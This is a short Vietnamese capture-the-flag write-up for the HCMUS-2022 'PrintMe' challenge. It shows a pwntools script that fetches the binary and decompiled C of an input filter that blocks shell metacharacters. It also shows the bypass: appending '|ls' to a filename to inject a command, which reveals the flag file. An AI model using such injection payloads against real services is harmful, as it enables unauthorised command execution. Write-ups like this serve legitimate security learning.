## Write-Up PrintMe (HCMUS-2022 Pwn)

Ok mới vào sẽ không thấy bài này cho Binary
Bài này cho ta sử dụng `\bin\cat`, thì mình có cat thử `printme\printme` thì nó trả về binary

Viết một đoạn python nhỏ để lấy binary
```python
from pwn import *

r = remote('103.245.250.31', 32131)
context.clear(os='linux', arch='x86_64', log_level='debug')

r.sendlineafter(b'file name!\n', b'printme/printme')
r.recvuntil(b'printme/printme \n')
recv = r.recvall()

with open('./printme', 'wb') as f:
    f.write(recv)
```
Đọc code thì thấy input đầu vào được check như sau:
```C
void secure(char **param_1) {
    size_t sVar1;
    unsigned long uVar2;
    undefined8 local_48;
    undefined8 local_40;
    undefined4 local_38;
    undefined2 local_34;
    undefined local_32;
    char *local_28;
    char local_1f;
    char local_1e;
    char local_1d;
    uint local_1c;
    // #&;`'"*?<>^()[]{}$,\t\n 
    local_48 = 0x3f2a2227603b2623;
    local_40 = 0x7b5d5b29285e3e3c;
    local_38 = 0x92c247d;
    local_34 = 0x200a;
    local_32 = 0;
    local_1d = '\0';
    local_1e = '\0';
    local_1f = '\0';
    while (**param_1 == '/') {
        local_1d = '\x01';
        *param_1 = *param_1 + 1;
    }
    if (local_1d != '\0') {
        puts("You cannot specify an absolute path starting with /!");
    }
    while (1) {
        local_28 = strstr(*param_1, "../");
        if (local_28 == (char *)0x0)
            break;
        local_1e = '\x01';
        local_28[1] = '/';
    }
    if (local_1e != '\0') {
        puts("You cannot use directory traversal with ../ !!");
    }
    local_1c = 0;
    while (1) {
        uVar2 = (unsigned long)local_1c;
        sVar1 = strlen((char *)&local_48);
        if (sVar1 <= uVar2)
            break;
        while (1) {
            local_28 = strchr(*param_1, (int)*(char *)((long)&local_48 + (unsigned long)local_1c));
            if (local_28 == (char *)0x0)
                break;
            local_1f = '\x01';
            *local_28 = '_';
        }
        local_1c = local_1c + 1;
    }
    if (local_1f != '\0') {
        printf(
            "Your filename should not contain dangerous characters like #&;`\'\"*?<>^()[]{}$,\\t\\n \n !!!");
    }
    return;
}
```
+ Nếu ký tự đầu là `/` thì cộng con trỏ để bỏ qua
+ Nếu trong chuỗi có đoạn `../` thì sẽ đổi thành `.//`
+ Các ký tự đặc biệt như ``#&;`'"*?<>^()[]{}$,\t\n`` sẽ đổi thành dấu `_`

Bài này mình cũng lúng túng 1 tiếng tìm đủ kiểu bypass, nhưng rồi nhận ra nó thiếu 1 dấu đó là `|`
Nếu nhập `printme/printme|ls` thì ls sẽ được thực thi

Trong kết quả trả về của `ls` thì có thư mực tên là secret, trong đó có flag
Điền `secret\flag.txt` để lấy cờ.

Vâng file Dockerfile đã lừa các b
